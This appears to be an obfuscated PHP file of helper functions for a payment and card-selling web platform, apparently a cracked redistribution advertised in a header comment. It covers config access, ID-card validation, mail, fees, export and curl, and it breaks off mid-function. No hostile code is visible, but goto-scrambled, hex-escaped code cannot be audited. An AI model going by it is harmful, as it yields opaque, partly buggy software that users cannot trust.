<?php
/* 解密版联系QQ：2337350403 - 官网：www.mfxw.cc */
 use service\DataService; use service\FileService; use service\NodeService; use think\Db; use Wechat\Loader; use think\Config; use upgrade\Service; goto nimmU; OWwi0: function local_image($url) { if (!is_array($result = FileService::download($url))) { goto Z3KVB; } return $result["\165\x72\x6c"]; Z3KVB: return $url; } function format_datetime($date, $format = "\x59\xe5\xb9\264\155\346\234\x88\x64\346\x97\245\40\110\x3a\x69\72\163") { return empty($date) ? '' : date($format, strtotime($date)); } function sysconf($name, $value = null) { static $config = []; if (!($value !== null)) { goto Z1Fpn; } list($config, $data) = [[], ["\156\141\x6d\x65" => $name, "\166\141\154\x75\x65" => $value]]; return DataService::save("\x53\171\163\164\145\x6d\x43\157\x6e\146\151\x67", $data, "\x6e\x61\155\145"); Z1Fpn: if (!empty($config)) { goto dFK_D; } $config = Db::name("\123\x79\163\x74\145\155\x43\157\156\146\x69\x67")->column("\x6e\x61\x6d\x65\54\166\141\x6c\x75\145"); dFK_D: return isset($config[$name]) ? $config[$name] : ''; } function auth($node) { return NodeService::checkAuthNode($node); } if (!function_exists("\141\x72\162\141\171\x5f\143\x6f\x6c\165\155\x6e")) { function array_column(array &$rows, $column_key, $index_key = null) { $data = []; foreach ($rows as $row) { if (empty($index_key)) { goto iTnE6; } $data[$row[$index_key]] = $row[$column_key]; goto sThck; iTnE6: $data[] = $row[$column_key]; sThck: gDpUt: } ce3i7: return $data; } } function J($code, $msg = '', $data = [], $url = null) { $return = ["\143\x6f\x64\x65" => $code, "\x6d\x73\x67" => $msg, "\x64\x61\x74\x61" => $data, "\165\x72\x6c" => $url, "\x74\151\x6d\x65\x73\x74\141\x6d\160" => time()]; return json($return); } function is_idcard_number($vStr) { goto izwHj; izwHj: $vCity = array("\61\61", "\61\62", "\x31\x33", "\61\64", "\x31\65", "\x32\x31", "\x32\x32", "\62\63", "\x33\61", "\x33\62", "\63\63", "\x33\x34", "\x33\x35", "\x33\x36", "\63\67", "\x34\x31", "\64\x32", "\64\63", "\x34\x34", "\64\65", "\x34\66", "\x35\60", "\65\x31", "\x35\62", "\65\63", "\65\x34", "\66\61", "\66\62", "\66\63", "\66\x34", "\66\65", "\67\x31", "\70\x31", "\x38\62", "\71\61"); if (preg_match("\x2f\x5e\x28\133\134\144\x5d\173\61\x37\175\x5b\170\130\134\144\135\x7c\133\x5c\144\135\173\x31\x35\175\51\x24\x2f", $vStr)) { goto fdaUq; } return false; fdaUq: if (in_array(substr($vStr, 0, 2), $vCity)) { goto r_eP9; } return false; r_eP9: $vStr = preg_replace("\57\133\170\130\x5d\x24\x2f\151", "\x61", $vStr); $vLength = strlen($vStr); if ($vLength == 18) { goto KiwJ7; } goto mkFtz; WTAXx: $i = 17; Mvfbb: if (!($i >= 0)) { goto ytpZE; } $vSubStr = substr($vStr, 17 - $i, 1); $vSum += pow(2, $i) % 11 * ($vSubStr == "\x61" ? 10 : intval($vSubStr, 11)); JPram: $i--; goto Mvfbb; ytpZE: if (!($vSum % 11 != 1)) { goto tLG_Y; } goto yFOdP; yFOdP: return false; tLG_Y: yXwMm: return true; goto v5BI7; mkFtz: $vBirthday = "\x31\x39" . substr($vStr, 6, 2) . "\x2d" . substr($vStr, 8, 2) . "\55" . substr($vStr, 10, 2); goto ExlL3; KiwJ7: $vBirthday = substr($vStr, 6, 4) . "\x2d" . substr($vStr, 10, 2) . "\55" . substr($vStr, 12, 2); ExlL3: if (!(date("\x59\x2d\x6d\x2d\x64", strtotime($vBirthday)) != $vBirthday)) { goto iUPNX; } return false; iUPNX: if (!($vLength == 18)) { goto yXwMm; } $vSum = 0; goto WTAXx; v5BI7: } function is_mobile_number($mobile) { if (is_numeric($mobile)) { goto QF3Dx; } return false; QF3Dx: return preg_match("\x23\136\61\x5b\x33\x2d\x39\x5d\x5c\144\173\x39\x7d\x24\x23", $mobile) ? true : false; } function generate_trade_no($flag = "\x41", $userid = 0) { if (sysconf("\x6f\162\144\145\x72\137\x74\171\x70\145") == 1) { goto WrKMV; } $trade_no = $flag . date("\171\x6d\144\x48\151\163") . str_pad(abs($userid - 10000), 4, 0) . str_pad(mt_rand(0, 99), 2, "\x30"); goto iFA70; WrKMV: $trade_no = sysconf("\165\163\x65\x72\137\157\x72\144\145\x72\137\160\162\157\x66\x69\x78") . date("\x79\x6d\x64\x48\x69\163") . str_pad(abs($userid - 10000), 4, 0) . str_pad(mt_rand(0, 99), 2, "\x30"); iFA70: $res = Db::name("\x6f\x72\144\145\x72")->where(["\x74\x72\x61\x64\x65\x5f\x6e\x6f" => $trade_no])->find(); if (!$res["\x73\x74\141\164\165\163"]) { goto WsDoq; } $trade_no = generate_trade_no($flag, $userid); WsDoq: $res = Db::name("\x75\156\151\161\x75\145\137\x6f\x72\x64\145\x72\156\x6f")->insert(["\164\162\x61\144\145\x5f\156\x6f" => $trade_no]); if (!($res != 1)) { goto dj6dv; } $trade_no = generate_trade_no($flag, $userid); dj6dv: return $trade_no; } function push_umeng($device_tokens, $ticker = '', $title = '', $text = '', $extra = []) { $UPush = new \umeng\UPush(sysconf("\x75\x70\x75\x73\x68\137\x61\160\160\153\145\171"), sysconf("\165\160\x75\163\x68\137\141\160\x70\x4d\141\163\164\145\x72\123\x65\143\x72\x65\164")); $res = $UPush->sendAndroidUnicast($device_tokens, $ticker, $title, $text, $extra); return $res; } goto Ss2QB; L2zPn: function get_channel_children_pay($fields, $value) { $array = []; if (!(empty($fields) || empty($value) || !property_exists((object) $value, "\160\x61\x79\137\164\171\160\145") || !strpos($fields, "\x63\x68\x65\x63\153\x62\157\x78"))) { goto LB3T6; } return ''; LB3T6: $fields = explode("\174", $fields); foreach ($fields as $v) { if (!(strpos($v, "\x63\x68\x65\143\153\x62\x6f\170") && strpos($v, "\x70\141\x79\137\164\171\x70\145"))) { goto sW2A4; } list($text, $temp) = explode("\72", $v); $array["\164\x65\x78\164"] = $text; $temp = explode("\x20", $temp); $items = explode("\x2c", array_pop($temp)); $selected = explode("\x2c", $value->pay_type); foreach ($items as $val) { list($vv, $t) = explode("\x2d", $val); if (!in_array($vv, $selected)) { goto WmQtZ; } $array["\143\x68\151\x6c\x64\162\x65\x6e"][] = ["\x74\x65\x78\x74" => $t, "\x76\x61\x6c\x75\x65" => $vv]; WmQtZ: x4CJU: } j69yd: goto Fd4tc; sW2A4: quTQt: } Fd4tc: return $array; } function sendMessage($from_id, $to_id, $title, $content) { $res = Db::name("\x4d\x65\x73\163\141\147\x65")->insert(["\146\x72\157\x6d\x5f\151\x64" => $from_id, "\x74\157\137\151\144" => $to_id, "\164\x69\x74\154\145" => $title, "\143\x6f\156\164\145\x6e\164" => $content, "\x73\x74\141\164\165\x73" => 0, "\x63\x72\145\x61\x74\x65\x5f\x61\164" => $_SERVER["\122\105\121\x55\x45\x53\x54\x5f\124\x49\x4d\x45"]]); return $res; } function get_cash_fee($money, $pre = '') { $type = (int) sysconf($pre . "\143\x61\163\x68\137\146\145\x65\x5f\x74\171\x70\x65"); $fee = sysconf($pre . "\143\x61\x73\150\x5f\x66\x65\x65"); switch ($type) { case 1: return $fee >= 0 ? round($fee, 2) : 0; goto MYAhg; case 100: if ($fee < 0 || $fee > 100) { goto Yw2RZ; } return round($fee / 100 * $money, 2); goto Nwtak; Yw2RZ: return 0; Nwtak: goto MYAhg; default: return 0; goto MYAhg; } S3gfO: MYAhg: } function get_auto_cash_fee($money) { $type = (int) sysconf("\141\x75\164\x6f\137\143\141\163\150\x5f\146\145\145\137\x74\171\x70\145"); $fee = sysconf("\141\x75\164\x6f\137\x63\141\x73\x68\137\x66\145\145"); switch ($type) { case 1: return $fee >= 0 ? round($fee, 2) : 0; goto uZ5ff; case 100: if ($fee < 0 || $fee > 100) { goto p6AFJ; } return round($fee / 100 * $money, 2); goto tHia0; p6AFJ: return 0; tHia0: goto uZ5ff; default: return 0; goto uZ5ff; } u2wcv: uZ5ff: } function get_spread_rebate_rate() { $rate = sysconf("\163\x70\162\145\x61\x64\137\x72\x65\142\x61\164\x65\x5f\162\x61\x74\145"); if (!($rate === null || $rate < 0 || $rate > 100)) { goto pX1RD; } return 0; pX1RD: return round($rate / 100, 4); } function check_wordfilter($str) { if (!($str !== '' && sysconf("\x73\151\164\x65\137\x77\x6f\x72\144\x66\x69\x6c\164\x65\x72\137\163\164\141\x74\x75\163") == 1)) { goto JI7u4; } $words = explode("\174", trim(sysconf("\x73\151\x74\145\x5f\167\x6f\x72\x64\x66\x69\154\164\145\162\x5f\144\x61\156\x67\145\162"), "\174")); foreach ($words as $word) { if (!$word) { goto MmUCd; } if (!(strpos($str, $word) !== false)) { goto WK3EL; } return $word; goto Pf73N; WK3EL: MmUCd: ImDlb: } Pf73N: JI7u4: return true; } function get_short_domain($url, $type = '') { if (!($type === '')) { goto WV5bC; } $type = sysconf("\163\x69\164\x65\x5f\144\157\x6d\141\151\x6e\137\x73\x68\x6f\162\x74"); if (!($type === '')) { goto qHeqA; } return ''; qHeqA: WV5bC: $dwz = \app\common\util\DWZ::load($type); switch ($type) { case "\102\x61\151\x64\x75": $shortDomain = $dwz->create($url); goto wxPc7; case "\123\x69\x6e\x61": $shortDomain = $dwz->create($url); goto wxPc7; case "\125\x36": $shortDomain = $dwz->create($url); goto wxPc7; default: return ''; goto wxPc7; } Fbx32: wxPc7: if (!($shortDomain === false)) { goto jbYvC; } return ''; jbYvC: return $shortDomain; } function get_uniqid($len = 32) { return substr(md5(uniqid(md5(microtime(true)), true)), 0, $len); } function verify_code($code, $id = '') { $captcha = new \think\captcha\Captcha(); return $captcha->check($code, $id); } function record_file_log($filename, $content) { file_put_contents(LOG_PATH . $filename . "\x2e\154\157\x67", date("\343\x80\x90\131\x2d\x6d\x2d\x64\x20\110\x3a\151\x3a\x73\xe3\200\221") . "\xd\12{$content}\xd\12\15\12", FILE_APPEND); } goto Goz6n; Ss2QB: function random_str($length = 32) { $chars = "\141\142\143\x64\145\146\x67\150\x69\152\x6b\154\155\156\x6f\x70\161\162\163\164\165\x76\167\170\171\x7a\x30\61\62\63\64\x35\66\x37\x38\x39"; $str = ''; $i = 0; hwcLZ: if (!($i < $length)) { goto W0cnM; } $str .= substr($chars, mt_rand(0, strlen($chars) - 1), 1); E65a1: $i++; goto hwcLZ; W0cnM: return $str; } function generate_excel($title, $data, $filename, $type = "\x66\x69\x6c\x65") { goto oc4u8; O15v7: ob_flush(); flush(); fclose($file); exit; goto eg5Fq; oc4u8: $file_name = $filename . "\x2e\143\x73\x76"; if ($type == "\146\151\x6c\145") { goto pbgK2; } header("\103\157\156\x74\145\156\164\x2d\x54\x79\160\x65\72\x20\x61\x70\160\154\x69\143\x61\164\151\x6f\156\x2f\x76\x6e\x64\x2e\155\163\x2d\x65\x78\x63\x65\x6c"); header("\103\x6f\x6e\x74\145\156\164\55\104\151\x73\x70\x6f\163\x69\x74\x69\157\156\72\x20\x61\164\164\141\143\x68\155\x65\x6e\x74\73\x66\x69\x6c\145\156\141\x6d\145\x3d" . $file_name); header("\103\x61\x63\150\x65\x2d\103\x6f\156\x74\162\157\154\72\x6d\x75\163\x74\55\162\145\x76\x61\x6c\x69\x64\141\164\145\x2c\x70\157\x73\164\x2d\x63\x68\145\x63\x6b\75\x30\x2c\160\162\145\x2d\143\x68\145\143\x6b\x3d\60"); header("\105\170\160\x69\x72\x65\163\x3a\60"); header("\x50\162\x61\147\155\141\72\x70\x75\x62\154\x69\x63"); $file = fopen("\x70\150\160\x3a\x2f\57\x6f\x75\x74\x70\x75\x74", "\141"); goto Pnvpf; pbgK2: goto HoZWL; HoZWL: $file = fopen(TEMP_PATH . $file_name, "\x61"); Pnvpf: $limit = 10000; $calc = 0; foreach ($title as $v) { $tit[] = iconv("\125\x54\106\55\70", "\107\x42\x32\x33\61\62\57\57\111\107\116\x4f\x52\105", $v); MiPt9: } HWOlv: fputcsv($file, $tit); foreach ($data as $v) { $calc++; if (!($limit == $calc)) { goto CqwCL; } ob_flush(); flush(); $calc = 0; CqwCL: foreach ($v as $t) { $tarr[] = "\11" . iconv("\125\124\x46\x2d\70", "\x47\102\x32\63\x31\62\x2f\x2f\x49\x47\x4e\x4f\x52\x45", $t) . ''; SHDRv: } JMfPD: fputcsv($file, $tarr); unset($tarr); ggvJR: } YIhIC: unset($data); goto O15v7; eg5Fq: } function sendMail($to, $title, $content, $filePath = '', $throwExceptions = false) { goto pCmrj; p9dfm: record_file_log("\x65\x6d\x61\151\154\x5f\x65\162\162\157\x72", "\x69\x6e\144\145\x78\72\x20" . $index . "\xd\12" . $mail->ErrorInfo); if ($try >= $max) { goto t6QCf; } session("\145\155\141\x69\x6c\137\x74\x72\x79", $try + 1); session("\x6c\x61\x73\x74\137\x74\162\171\137\145\x6d\141\x69\x6c", session("\154\141\x73\164\x5f\164\x72\x79\137\145\x6d\x61\151\154") . "\x2c" . $index); return sendMail($to, $title, $content, $filePath, $throwExceptions); goto S1AMy; t6QCf: session("\145\155\x61\151\154\x5f\x74\162\x79", 0); session("\154\x61\x73\x74\x5f\x74\x72\x79\x5f\x65\155\x61\x69\x6c", ''); return false; goto A4yUl; YOLK7: if (!in_array($index, $tried)) { goto i7g21; } $index = rand(0, 2); goto Yl8Bf; i7g21: if (empty($index)) { goto Kp7V5; } $configIndex = $index; goto oeDpL; Kp7V5: $configIndex = ''; oeDpL: goto oTsxy; LRx1J: $try = session("\x65\155\141\x69\x6c\137\164\x72\x79"); if (!empty($try)) { goto peB4M; } session("\x65\155\141\x69\154\137\x74\x72\x79", 0); peB4M: if (!$mail->Send()) { goto Vhh05; } session("\145\155\x61\x69\154\137\x74\x72\x79", 0); session("\154\x61\163\x74\x5f\x74\162\171\137\145\155\141\151\154", ''); return true; goto GY0hy; Vhh05: goto p9dfm; A4yUl: S1AMy: GY0hy: goto bx_0d; zULHA: $mail->Username = $from; $mail->Password = $password; $mail->Subject = $title; $mail->AltBody = "\x74\x65\170\164\57\x68\164\x6d\x6c"; $mail->Body = $content; $mail->IsHTML(true); $mail->AddAddress(trim($to), ''); if (empty($filePath)) { goto VKRcb; } $mail->AddAttachment($filePath); VKRcb: goto LRx1J; oTsxy: $host = sysconf("\145\155\x61\x69\154\137\163\155\x74\x70" . $configIndex); $port = sysconf("\x65\155\x61\x69\154\137\160\157\162\x74" . $configIndex); $from = sysconf("\145\155\x61\x69\x6c\137\x75\163\145\162" . $configIndex); $password = sysconf("\x65\155\141\151\154\x5f\x70\x61\x73\163" . $configIndex); $mail->Host = $host; $mail->Port = $port; $mail->From = $from; $mail->FromName = sysconf("\145\x6d\141\x69\154\137\x6e\141\x6d\145"); $mail->SMTPAuth = true; $mail->SMTPSecure = "\163\163\154"; goto zULHA; pCmrj: $mail = new Util\Mailer\PHPMailer($throwExceptions); $mail->CharSet = "\x75\x74\146\55\x38"; $mail->IsSMTP(); $max = 2; $index = rand(0, 2); $tried = explode("\54", trim("\54", session("\154\x61\163\x74\x5f\x74\x72\x79\x5f\145\155\141\x69\x6c"))); if (!empty($tried)) { goto GmN1N; } $tried = []; GmN1N: Yl8Bf: goto YOLK7; bx_0d: } function get_paytype_list() { $pay_type = null; try { $pay_type = Db::name("\x70\x61\171\x5f\x74\171\160\145")->select(); foreach ($pay_type as $item) { if (!$item["\x73\165\142\137\x6c\x69\x73\164\163"]) { goto hIGlk; } $item["\x73\x75\142\x5f\154\x69\163\x74\x73"] = json_decode($item["\x73\165\x62\x5f\154\151\163\x74\163"]); hIGlk: dSRxj: } yfqOE: } catch (\think\Exception $e) { $pay_type = null; } if (!$pay_type) { goto XNsCC; } return $pay_type; goto ml0QV; XNsCC: return config("\160\141\x79\164\x79\x70\x65\x5f\x63\x6f\156\x66\x69\147"); ml0QV: } function get_paytype_info($paytype) { $pay_type = null; try { $pay_type = Db::name("\x70\x61\x79\x5f\164\171\160\x65")->find(["\151\x64" => $paytype]); if (!$pay_type["\x73\x75\142\137\x6c\x69\x73\164\x73"]) { goto uj0MG; } $pay_type["\x73\x75\142\137\154\151\163\164\x73"] = json_decode($pay_type["\163\165\x62\137\154\x69\163\164\163"]); uj0MG: } catch (\think\Exception $e) { $pay_type = null; } if (!$pay_type) { goto beN2j; } return $pay_type; goto pbr_s; beN2j: return isset(config("\160\141\171\x74\x79\x70\145\137\143\x6f\156\146\x69\147")[$paytype]) ? config("\160\x61\171\164\x79\x70\x65\x5f\143\157\156\x66\x69\147")[$paytype] : []; pbr_s: } function get_paytype_name($paytype, $type = 0) { $pay_type = null; try { $pay_type = Db::name("\x70\x61\x79\x5f\164\x79\x70\145")->find(["\151\144" => $paytype]); if (!$pay_type["\163\x75\x62\x5f\x6c\x69\x73\164\163"]) { goto RuG5q; } $pay_type["\x73\165\142\x5f\x6c\151\x73\x74\163"] = json_decode($pay_type["\163\165\x62\137\x6c\151\x73\164\x73"]); RuG5q: } catch (\think\Exception $e) { $pay_type = null; } if ($pay_type) { goto cWreY; } $pay_type = isset(config("\x70\x61\x79\x74\x79\x70\x65\x5f\143\157\x6e\146\151\147")[$paytype]) ? config("\x70\x61\x79\164\x79\x70\x65\137\x63\x6f\x6e\146\151\x67")[$paytype] : null; cWreY: if ($pay_type) { goto Vshgq; } return ''; Vshgq: if ($type == 0) { goto gQoa3; } return $pay_type["\156\141\x6d\x65"]; goto RTGhP; gQoa3: $product_id = $pay_type["\160\x72\x6f\x64\x75\143\164\x5f\151\x64"]; if ($product_id) { goto BxW4c; } return ''; goto cns3A; BxW4c: return isset(config("\x70\x61\171\x5f\x70\x72\157\144\x75\143\164")[$product_id]) ? config("\160\141\171\137\160\x72\157\144\165\143\164")[$product_id] : ''; cns3A: RTGhP: } function generate_qrcode_link($url) { return "\x68\164\x74\x70\163\72\57\57\141\160\151\x2e\x71\162\163\x65\x72\166\x65\x72\56\143\157\x6d\x2f\166\x31\x2f\143\x72\145\141\x74\x65\x2d\x71\162\55\143\x6f\x64\x65\x2f\77\x73\151\172\x65\x3d\x31\x35\60\170\x31\x35\60\x26\144\141\164\141\x3d" . $url; } function record_buyer_money_log($business_type, $user_id, $money, $balance, $reason) { $businessTypes = ["\x75\x6e\x66\162\x65\x65\x7a\x65" => "\350\xa7\243\345\206\xbb\351\207\221\xe9\xa2\x9d", "\x66\x72\x65\x65\172\145" => "\xe5\206\273\xe7\273\x93\351\x87\x91\351\xa2\235", "\x63\141\163\150\x5f\x6e\x6f\164\x70\141\x73\163" => "\346\x8f\x90\xe7\216\260\346\234\252\351\200\232\xe8\277\x87", "\x63\x61\x73\150\x5f\x73\165\143\143\145\x73\163" => "\xe6\217\220\347\216\260\xe6\210\x90\xe5\212\237", "\141\160\x70\x6c\x79\137\143\141\x73\x68" => "\xe7\x94\263\xe8\xaf\267\xe6\x8f\x90\xe7\216\260", "\141\x64\155\151\156\137\151\156\x63" => "\xe5\220\216\xe5\x8f\260\346\x93\x8d\xe4\275\234\xe5\x8a\xa0\351\222\xb1", "\x61\144\155\x69\x6e\x5f\x64\x65\143" => "\xe5\220\x8e\xe5\217\xb0\346\223\x8d\344\xbd\x9c\346\211\xa3\351\x92\xb1"]; $tag = isset($businessTypes[$business_type]) ? "\xe3\200\x90{$businessTypes[$business_type]}\xe3\x80\221" : ''; $res = Db::name("\x42\x75\171\x65\x72\x4d\157\x6e\x65\x79\x4c\x6f\x67")->insert(["\142\x75\163\x69\x6e\x65\163\x73\137\x74\x79\160\145" => $business_type, "\x75\x73\x65\x72\137\151\144" => $user_id, "\155\x6f\156\145\x79" => round($money, 3), "\x62\141\154\x61\x6e\143\145" => round($balance, 3), "\162\145\x61\x73\157\x6e" => $tag . $reason, "\x63\x72\145\141\164\x65\137\141\164" => time()]); return $res; } function record_user_poundage_log($business_type, $user_id, $money, $balance, $reason) { $businessTypes = ["\x75\156\x66\x72\145\x65\x7a\x65" => "\350\247\243\xe5\x86\xbb\xe9\x87\x91\351\242\235", "\146\162\145\x65\172\x65" => "\xe5\206\xbb\xe7\xbb\x93\351\207\221\351\xa2\x9d", "\x61\x64\155\x69\156\x5f\151\x6e\143" => "\345\220\216\345\x8f\260\346\223\x8d\344\xbd\234\xe5\xa2\236\xe5\212\xa0", "\141\x64\x6d\x69\x6e\x5f\x64\145\143" => "\xe5\220\216\345\x8f\260\346\223\215\344\275\234\xe6\x89\243\xe9\x99\244", "\162\x65\x63\150\141\x72\x67\145" => "\xe5\234\250\347\272\277\345\x85\205\345\x80\xbc", "\146\145\x65" => "\xe6\211\213\347\xbb\255\350\264\xb9", "\147\x6f\x6f\144\x73\x5f\163\157\x6c\x64" => "\345\215\x96\345\207\272\xe5\225\x86\xe5\223\201"]; $tag = isset($businessTypes[$business_type]) ? "\xe3\x80\220{$businessTypes[$business_type]}\xe3\200\x91" : ''; $res = Db::name("\125\163\145\x72\120\x6f\x75\x6e\144\141\147\145\x4c\157\147")->insert(["\142\165\x73\x69\156\x65\x73\x73\137\x74\171\x70\x65" => $business_type, "\165\x73\145\162\x5f\151\144" => $user_id, "\155\157\156\145\x79" => round($money, 3), "\142\141\154\x61\x6e\143\x65" => round($balance, 3), "\162\145\x61\163\x6f\156" => $tag . $reason, "\143\162\145\x61\164\145\137\x61\x74" => time()]); return $res; } function record_user_money_log($business_type, $user_id, $money, $balance, $reason) { $businessTypes = ["\165\x6e\146\x72\145\145\172\145" => "\xe8\xa7\243\xe5\206\273\351\x87\221\xe9\242\x9d", "\x66\162\145\x65\x7a\x65" => "\345\x86\xbb\xe7\xbb\x93\xe9\207\221\351\242\x9d", "\x72\145\143\150\x61\x72\x67\145" => "\345\234\xa8\xe7\xba\xbf\xe5\x85\205\xe5\200\274", "\163\x75\x62\137\x73\x6f\154\144\x5f\162\145\x62\x61\x74\145" => "\xe4\xb8\213\xe7\272\xa7\xe5\215\x96\345\x87\272\345\225\x86\xe5\223\x81\350\xbf\x94\344\xbd\243", "\163\165\142\x5f\x66\145\145\x5f\162\145\142\141\x74\x65" => "\xe4\270\213\xe7\272\xa7\346\x89\x8b\xe7\273\255\350\xb4\271\xe8\277\x94\xe4\xbd\243", "\x63\141\x73\150\x5f\x6e\157\x74\160\141\x73\163" => "\xe6\x8f\220\347\x8e\260\346\x9c\xaa\351\200\232\350\xbf\x87", "\143\141\x73\150\137\163\x75\x63\x63\x65\163\x73" => "\346\217\x90\xe7\x8e\260\xe6\x88\220\345\212\x9f", "\141\x70\x70\x6c\171\x5f\143\x61\163\x68" => "\347\224\xb3\350\xaf\xb7\xe6\217\220\xe7\216\260", "\x61\x64\155\151\156\137\151\x6e\x63" => "\345\220\216\345\x8f\xb0\xe6\223\x8d\344\275\x9c\xe5\x8a\xa0\351\222\261", "\x61\144\155\151\x6e\137\x64\x65\x63" => "\345\220\216\345\x8f\xb0\xe6\x93\x8d\xe4\275\234\xe6\211\243\xe9\222\261", "\146\145\x65" => "\346\211\213\xe7\xbb\xad\350\xb4\271", "\x67\157\157\144\163\137\x73\x6f\154\144" => "\345\x8d\226\345\207\xba\345\x95\x86\xe5\x93\201", "\163\x75\142\137\162\x65\x67\x69\163\x74\145\x72" => "\346\x8e\250\345\xb9\xbf\xe6\xb3\250\345\206\x8c\345\xa5\226\345\212\261"]; $tag = isset($businessTypes[$business_type]) ? "\xe3\200\220{$businessTypes[$business_type]}\343\x80\x91" : ''; $res = Db::name("\125\163\145\x72\115\x6f\x6e\145\171\x4c\x6f\147")->insert(["\x62\165\163\x69\156\145\163\163\137\x74\x79\x70\145" => $business_type, "\x75\163\145\162\137\151\144" => $user_id, "\x6d\x6f\x6e\x65\171" => round($money, 3), "\142\141\x6c\141\x6e\143\145" => round($balance, 3), "\162\145\141\x73\x6f\x6e" => $tag . $reason, "\x63\x72\145\141\164\145\x5f\141\164" => time()]); return $res; } goto MYRhQ; CBlq8: function get_version_list_url() { $versionListUrl = config("\x64\x65\x70\154\157\x79\x5f\143\x6f\155\155\157\x6e\56\166\x65\x72\x73\x69\x6f\156\x5f\x6c\x69\163\164\x5f\x75\x72\x6c"); if ($versionListUrl) { goto tiJYX; } throw new Exception("\xe9\205\215\xe7\xbd\256\351\224\x99\xe8\257\xaf"); tiJYX: return $versionListUrl . DS . config("\x64\145\160\154\157\171\137\165\x6e\x69\161\165\x65\56\x70\x72\157\x6a\x65\x63\164\x5f\151\144") . DS . config("\x64\x65\x70\154\157\171\137\165\156\151\161\165\x65\x2e\x65\156\166\151\162\157\x6e\155\x65\156\x74\137\x69\144"); } function get_version_update_url($versionHash) { $versionUpdateUrl = config("\x64\145\x70\x6c\157\x79\x5f\143\157\x6d\x6d\x6f\156\x2e\x76\145\x72\163\x69\x6f\x6e\x5f\165\160\144\x61\164\x65\x5f\165\x72\x6c"); if ($versionUpdateUrl) { goto Fm7pe; } throw new Exception("\351\x85\x8d\347\xbd\256\xe9\x94\231\xe8\xaf\xaf"); Fm7pe: return $versionUpdateUrl . DS . $versionHash . DS . config("\144\145\x70\154\157\x79\x5f\165\156\151\161\x75\x65\56\145\x6e\x76\151\x72\x6f\x6e\155\145\156\164\137\151\144"); } function generate_txt($title, $data, $filename, $type = "\x66\151\154\145") { $file_name = $filename . "\x2e\x74\170\x74"; if ($type == "\x66\151\154\x65") { goto KQ4Fo; } header("\103\157\x6e\x74\x65\156\x74\x2d\164\171\x70\145\72\x20\x20\40\x61\x70\160\x6c\x69\x63\141\164\x69\157\156\57\x6f\x63\164\x65\x74\55\x73\x74\162\145\141\x6d\40"); header("\x41\143\143\x65\x70\164\55\x52\x61\156\147\145\x73\72\40\40\x20\142\x79\x74\x65\163\40"); header("\x43\x6f\x6e\164\145\156\x74\55\104\x69\x73\x70\x6f\x73\151\164\151\157\156\x3a\40\40\40\x61\x74\164\x61\143\150\155\145\x6e\x74\73\40\40\40\146\151\154\145\x6e\141\155\x65\x3d" . $filename . "\x2e\164\170\164\40"); header("\105\x78\160\151\162\x65\x73\72\x20\x20\x20\x30\x20"); header("\103\141\143\150\x65\x2d\103\x6f\156\164\162\x6f\154\x3a\x20\40\x20\x6d\x75\163\164\55\x72\145\166\141\154\x69\x64\x61\164\x65\54\40\40\x20\160\x6f\x73\x74\x2d\143\x68\x65\x63\153\x3d\x30\x2c\x20\x20\x20\160\x72\145\55\143\150\x65\143\153\75\x30\x20"); header("\x50\162\x61\147\155\141\x3a\40\40\40\x70\165\x62\x6c\x69\x63\x20"); foreach ($title as $v) { echo iconv("\x55\x54\106\55\70", "\x47\x42\x32\63\61\62\57\x2f\111\107\x4e\x4f\x52\105", trim($v)) . "\x9"; wui3x: } Y625L: echo "\15\xa"; echo PHP_EOL; foreach ($data as $v) { foreach ($v as $t) { echo iconv("\125\x54\106\55\x38", "\107\x42\x32\63\61\62\57\x2f\111\107\116\x4f\x52\105", trim($t)) . "\11"; GWc7u: } PVttJ: echo PHP_EOL; echo "\15\xa"; GahnL: } Z_O4z: unset($data); exit; goto xYXMe; KQ4Fo: $file = fopen(TEMP_PATH . $file_name, "\x61"); xYXMe: } function getPaytypeByProductId($productId) { $payTypes = null; try { $payTypes = Db::name("\160\141\x79\x5f\164\171\x70\x65")->select(); foreach ($payTypes as $item) { if (!$item["\x73\x75\x62\x5f\154\151\x73\164\x73"]) { goto W0tS0; } $item["\163\x75\142\x5f\x6c\x69\163\x74\x73"] = json_decode($item["\163\x75\x62\137\154\151\x73\164\163"]); W0tS0: sAYzR: } fmOm_: } catch (\think\Exception $e) { $payTypes = null; } if (!empty($payTypes)) { goto lxDB8; } $payTypes = config("\160\x61\171\x74\171\160\145\137\143\x6f\156\146\x69\x67"); lxDB8: $paytype = []; foreach ($payTypes as $k => $v) { if (!($v["\x70\x72\x6f\144\165\x63\164\x5f\x69\x64"] == $productId)) { goto nIKfu; } array_push($paytype, $k); nIKfu: BoqZc: } rVjMM: return $paytype; } function isQQ($qq) { if (preg_match("\x2f\x5e\x5b\x31\x2d\x39\135\133\x30\x2d\x39\135\173\x34\54\x31\x31\175\44\x2f", $qq)) { goto glG6O; } return false; goto CdU12; glG6O: return true; CdU12: } function arrayToXml($arr) { $xml = "\x3c\x3f\170\155\x6c\x20\166\x65\x72\163\x69\x6f\x6e\x3d\47\x31\56\x30\x27\40\x65\x6e\x63\x6f\144\x69\156\147\75\47\125\124\x46\x2d\x38\x27\x3f\76\x3c\170\x6d\x6c\x3e"; foreach ($arr as $key => $val) { $xml .= "\74{$key}\76\x3c\x21\133\103\x44\x41\124\101\x5b{$val}\135\x5d\76\74\57{$key}\76"; wFOlI: } qSqVE: $xml .= "\74\x2f\170\155\154\x3e"; return $xml; } function xmlToArray($xml) { libxml_disable_entity_loader(true); $arr = json_decode(json_encode(simplexml_load_string($xml, "\123\151\155\x70\154\x65\x58\x4d\114\105\x6c\x65\155\x65\156\164", LIBXML_NOCDATA)), true); return $arr; } function postCurl($url, $param, $second = 30, $refer = '') { goto HX_GG; QPTo9: curl_close($ch); return $data; PU0jH: goto xPGec; jfQHI: curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $param); $data = curl_exec($ch); if ($data) { goto ChKRK; } $error = curl_errno($ch); curl_close($ch); throw new Exception("\x63\x75\162\x6c\345\207\272\351\224\231\xef\xbc\214\xe9\224\231\xe8\xaf\257\347\240\201\72{$error}"); goto PU0jH; ChKRK: goto QPTo9; HX_GG: $ch = curl_init(); if (!$refer) { goto fiexh; } curl_setopt($ch, CURLOPT_REFERER, $refer); fiexh: curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER["\x48\x54\124\120\x5f\125\123\x45\x52\137\x41\107\x45\x4e\124"]); $header[] = 